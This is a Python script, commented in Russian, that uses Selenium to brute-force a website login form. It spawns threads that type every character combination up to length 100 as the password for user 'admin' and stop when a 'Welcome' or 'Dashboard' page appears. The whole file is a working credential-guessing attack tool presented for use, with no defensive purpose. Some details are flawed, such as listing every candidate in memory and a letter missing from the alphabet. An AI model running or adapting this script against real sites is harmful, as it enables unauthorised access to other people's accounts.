import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import itertools

class BrutForceThread(threading.Thread):
    def __init__(self, username, password_iterator, url, stop_event):
        super().__init__()
        self.username = username
        self.password_iterator = password_iterator
        self.url = url
        self.stop_event = stop_event  # событие для остановки всех потоков

    def run(self):
        driver = webdriver.Chrome(executable_path='путь/до/chromedriver')
        driver.get(self.url)

        for pwd in self.password_iterator:
            if self.stop_event.is_set():
                break  # Если пароль уже найден в другом потоке

            try:
                login_input = driver.find_element(By.ID, 'username')  # замени селектор
                password_input = driver.find_element(By.ID, 'password')
                submit_button = driver.find_element(By.ID, 'login-button')

                login_input.clear()
                login_input.send_keys(self.username)
                password_input.clear()
                password_input.send_keys(pwd)

                submit_button.click()
                time.sleep(2)

                if "Welcome" in driver.page_source or "Dashboard" in driver.page_source:
                    print(f"[+] Пароль найден: {pwd}")
                    self.stop_event.set()  # сигналим остальным потокам остановиться
                    break
                else:
                    print(f"[-] Пароль не подошел: {pwd}")

                driver.get(self.url)
                time.sleep(1)

            except Exception as e:
                print(f"Ошибка: {e}")
                break

        driver.quit()

def generate_passwords(chars, length):
    return (''.join(p) for p in itertools.product(chars, repeat=length))

if __name__ == '__main__':
    url = 'https://example.com/login'
    username = 'admin'
    chars = '+-/*!&$#?=@<>abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    min_length = 1
    max_length = 100 # максимальная длина пароля, до которой перебираем
    num_threads = 2

    stop_event = threading.Event()

    for length in range(min_length, max_length + 1):
        if stop_event.is_set():
            break

        print(f"Перебор паролей длины {length}")

        passwords = list(generate_passwords(chars, length))
        chunk_size = len(passwords) // num_threads
        threads = []

        for i in range(num_threads):
            start = i * chunk_size
            end = None if i == num_threads - 1 else (i + 1) * chunk_size
            pw_chunk = passwords[start:end]

            thread = BrutForceThread(username, iter(pw_chunk), url, stop_event)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    if not stop_event.is_set():
        print("Пароль не найден в заданном диапазоне длины.")
    else:
        print("Брутфорс успешно завершён.")
